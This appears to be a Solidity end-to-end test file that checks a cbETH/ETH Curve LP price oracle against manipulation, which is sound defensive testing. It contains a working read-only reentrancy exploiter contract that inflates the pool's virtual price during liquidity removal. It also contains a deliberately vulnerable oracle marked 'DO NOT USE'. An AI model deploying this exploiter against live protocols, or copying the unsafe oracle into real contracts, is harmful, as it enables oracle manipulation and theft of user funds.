// SPDX-License-Identifier: MIT
pragma solidity >=0.8.4 <0.9.0;

import {CommonE2EBase, TestConstants} from '@test/e2e/Common.sol';
import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import {AggregatorV2V3Interface} from '@chainlink/interfaces/AggregatorV2V3Interface.sol';
import {IV2Pool} from '@interfaces/utils/ICurvePool.sol';
import {CbEthEthOracle} from '@contracts/periphery/oracles/CbEthEthOracle.sol';
import {OracleRelay, IOracleRelay} from '@contracts/periphery/oracles/OracleRelay.sol';
import {FixedPointMathLib} from 'solady/utils/FixedPointMathLib.sol';

contract E2ECbEthEthOracle is CommonE2EBase {
  uint256 public constant POINT_ONE_PERCENT = 0.001e18;

  CbEthEthOracle public cbEthEthOracle;
  IOracleRelay public anchoredViewCbEth;
  IV2Pool public cbEthPool = IV2Pool(CBETH_ETH_CRV_POOL_ADDRESS);
  IERC20 public cbETH = IERC20(CBETH_ADDRESS);

  function setUp() public virtual override {
    super.setUp();

    // Deploy cbETH oracle relay
    anchoredViewCbEth = IOracleRelay(_createCbEthOracle(uniswapRelayEthUsdc, chainlinkEth));

    // Deploy cbEthEthOracle relay
    cbEthEthOracle = CbEthEthOracle(_createCbEthEthOracle(anchoredViewCbEth, anchoredViewEth));
  }

  // This test get's the price of 1 LP token in a way that is fully manipulatable by a sandwich attack
  // Do not use it in production
  function testCbEthReturnsTheCorrectPrice() public {
    // Get the LP
    IERC20 _cbETHLpToken = IERC20(cbEthPool.token());

    // Get the current value of the cbEth oracle
    uint256 _currentValue = cbEthEthOracle.currentValue();

    // Get the total supply of cbETHLpToken
    uint256 _totalSupply = _cbETHLpToken.totalSupply();
    // Get the balance of cbETH in the pool
    uint256 _cbETHBalanceE18 = cbETH.balanceOf(address(cbEthPool));
    // Get the balance of Eth in the pool
    uint256 _ethBalanceE18 = address(cbEthPool).balance;

    // Get the price of the tokens from chainlink
    uint256 _cbEthPrice = anchoredViewCbEth.peekValue();
    uint256 _ethPrice = uint256(AggregatorV2V3Interface(CHAINLINK_ETH_FEED_ADDRESS).latestAnswer()) * 10 ** 10;

    // Calculate the usd value of the whole pool
    uint256 _poolValue = ((_ethBalanceE18 * _ethPrice) + (_cbETHBalanceE18 * _cbEthPrice));
    // Calculate the value of 1 lp token
    uint256 _lpValue = _poolValue / _totalSupply;
    assertApproxEqRel(_currentValue, _lpValue, POINT_ONE_PERCENT);
  }
}

contract E2ECbEthSafeCurveLpOracleManipulations is E2ECbEthEthOracle {
  address public whale = 0x629184d792f1c937DBfDd7e1055233E22c1Ca2DF;
  CbEthEthCurveLPExploiter public exploiter;

  function setUp() public virtual override {
    super.setUp();
    // We impersonate the whale to get some cbETH
    vm.prank(whale);
    cbETH.transfer(address(this), 29_000 ether); // 29k cbETH for us

    // deploy the exploiter contract
    // solhint-disable-next-line reentrancy
    exploiter = new CbEthEthCurveLPExploiter(IV2Pool(CBETH_ETH_CRV_POOL_ADDRESS), cbETH, cbEthEthOracle);

    // We apporve a lot of cbETH
    cbETH.approve(address(exploiter), type(uint256).max);
  }

  function testEthSafeCurveLpOracleIsSafeFromManipulation() public {
    vm.expectRevert();
    exploiter.exec{value: 29_000 ether}(29_000 ether);
  }

  function testNotSafeOracleIsRektByManipulation() public {
    // This is an UNSAFE oracle for cbETH/ETH. DO NOT USE.
    UnsafeCbEthEthOracle _unsafeCbETHOracle =
      new UnsafeCbEthEthOracle(CBETH_ETH_CRV_POOL_ADDRESS, anchoredViewCbEth, anchoredViewEth);

    // deploy the exploiter contract with the unsafe oracle
    exploiter = new CbEthEthCurveLPExploiter(IV2Pool(CBETH_ETH_CRV_POOL_ADDRESS), cbETH, _unsafeCbETHOracle);

    // We approve max cbETH
    cbETH.approve(address(exploiter), type(uint256).max);

    exploiter.exec{value: 29_000 ether}(29_000 ether);

    assertEq(exploiter.wasManipulated(), true);
  }
}

contract UnsafeCbEthEthOracle is OracleRelay {
  IV2Pool public immutable CB_ETH_POOL;

  IOracleRelay public cbEthOracleRelay;
  IOracleRelay public ethOracleRelay;

  constructor(
    address _cbETHPool,
    IOracleRelay _cbEthOracleRelay,
    IOracleRelay _ethOracleRelay
  ) OracleRelay(OracleType.Chainlink) {
    CB_ETH_POOL = IV2Pool(_cbETHPool);
    cbEthOracleRelay = _cbEthOracleRelay;
    ethOracleRelay = _ethOracleRelay;
  }

  /// @notice The current reported value of the oracle
  /// @dev Implementation in _get
  /// @return _value The current value
  function peekValue() public view override returns (uint256 _value) {
    _value = _get();
  }

  /// @notice returns the price with 18 decimals
  /// @return _currentValue the current price
  function currentValue() external override returns (uint256 _currentValue) {
    _currentValue = _get();
  }

  /// @notice Calculated the price of 1 LP token
  /// @dev This function comes from the implementation in vyper
  /// @return _maxPrice The current value
  function _get() internal view returns (uint256 _maxPrice) {
    uint256 _vp = _getVirtualPrice();

    // Get the prices from chainlink and add 10 decimals
    uint256 _cbEthPrice = cbEthOracleRelay.peekValue();
    uint256 _ethPrice = ethOracleRelay.peekValue();

    uint256 _basePrices = (_cbEthPrice * _ethPrice);

    _maxPrice = (2 * _vp * FixedPointMathLib.sqrt(_basePrices)) / 1 ether;
    // removed discount since the % is so small that it doesn't make a difference
  }

  /// @notice returns the virtual price for the pool
  /// @return _value the virtual price
  function _getVirtualPrice() internal view returns (uint256 _value) {
    _value = CB_ETH_POOL.get_virtual_price();
  }
}

contract CbEthEthCurveLPExploiter {
  IV2Pool public pool;
  IERC20 public tokenB;
  IOracleRelay public oracle;
  bool public wasManipulated;
  uint256 internal _virtualPriceBeforeManipulation;

  constructor(IV2Pool _pool, IERC20 _tokenB, IOracleRelay _oracle) {
    pool = _pool;
    tokenB = _tokenB;
    oracle = _oracle;
  }

  // pool is assumed to be an ETH pool with just one other token (e.g. cbETH pool)
  function exec(uint256 _amountToken) public payable {
    _virtualPriceBeforeManipulation = pool.get_virtual_price();
    // prepare token
    tokenB.transferFrom(msg.sender, address(this), _amountToken);
    tokenB.approve(address(pool), type(uint256).max); // add liquidity
    uint256[2] memory _amounts = [msg.value, _amountToken];
    uint256 _lps = pool.add_liquidity{value: msg.value}(_amounts, 0, true);

    pool.token().approve(address(pool), type(uint256).max);

    uint256[2] memory _amounts0;
    pool.remove_liquidity(_lps, _amounts0, true); // virtual price increased
  }

  receive() external payable {
    // price of LP is pumped right now
    // malicious actions, use the remaining balance of lps if needed ...
    // in here, we need to borrow or withdraw
    oracle.currentValue();
    // Check if the virtual price is now higher
    if (pool.get_virtual_price() > _virtualPriceBeforeManipulation) wasManipulated = true;
  }
}
